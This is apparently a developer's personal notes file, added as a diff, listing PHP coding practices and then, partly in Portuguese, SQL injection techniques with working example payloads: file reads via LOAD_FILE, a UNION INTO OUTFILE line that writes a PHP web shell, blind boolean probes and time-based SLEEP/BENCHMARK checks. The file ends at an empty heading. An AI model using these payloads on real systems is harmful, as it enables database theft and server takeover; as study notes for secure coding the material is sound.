@@ -1,0 +1,38 @@
+1- Keep code readable and easy to search. Comment a lot and do a style guide
+2- Use allways as possible single quotes.
+3- Use names that make sense for Classes and Functions.
+4- NEVER thrust user input - should sanitze every user input.
+5- Separate the code by it's functionality ( when having thousands of lines of code, this can save a lot of time )
+6- All include files should end with .php
+7- Include and Require with full path (faster include)
+8- Limit the use of include_once or requie_once.
+9- Use static classes whenever possible.
+10- On loop control, not increment Globals or object variables.
+11- Define incrementation variables outside the loop
+12- Use caching systems because php scripts are recompiled at every call
+13- All sensitive information should be encrypted.
+
+
+
+HACKING TYPES:
+SQL Injection: Inject data, dump data, upload and execute files.
+    Exemplos:
+        LOAD_FILE: @url: page?id=1 union select 1, LOAD_FILE('/file_path/'),3,4 //READS FILE and returns contents as string.
+        FILE_WRITE: SELECT ... INTO OUTFILE ou SELECT ... INTO DUMPFILE
+        SHEL EXEC: @url: page?id=1 union select 1, "<?php system($_GET['cmd'])?>", 3 into outfile '/var/www/test.txt'
+
+BLIND SQL Injection: A app é vulneravel a injecção mas os resultados não vão aparecer. (Ex: boolean querys)
+        ?id = 2 and substring(version(),1,1) = 4 ( descobre se versão do sql = 4.x.x) ( se na der erro éporque é true )
+        ?id = 2 and character_length(database()) = 2 ( descobre tamanho do nome da base de dados ) - descobrir tamanho - descobrir nome
+        ?id = 2 and substring(database(),1,1) = 'a' ( verifica se a primeira letra do nome da base de dados é a) - descobrir nome
+        ?id = 2 and substring(database(),2,1) = 'a' ( verifica se a segunda letra do nome da base de dados é a) - descobrir nome
+
+TIME BASED SQL Attack: Verificando a resposta do servidor usando funções de benchmark
+        ?id = 1-sleep(4) - caso carregue mais lento que o normal está alvo de ataque.
+        DESCOBRINDO MYSQL V
+        ?id= 1-IF(MID(VERSION(),1,1)='5',SLEEP(10),0) ->V 5.x caso demore mt a carregar
+        ?id= 1-IF(MID(version(),1,1)='4',BENCHMARK(1000000000,ENCODE('CSPF','CSPF')),0) -> V4.x caso demore mt a carregar.
+        DESCOBRINDO MSSQL V
+        WAIT FOR DELAY 'hh:mm:ss' Exemplo: IF SYSTEM_USER= 'sa' wait for delay '00:00:10'
+
+UNION EXPLOIT TECHNIQUE:
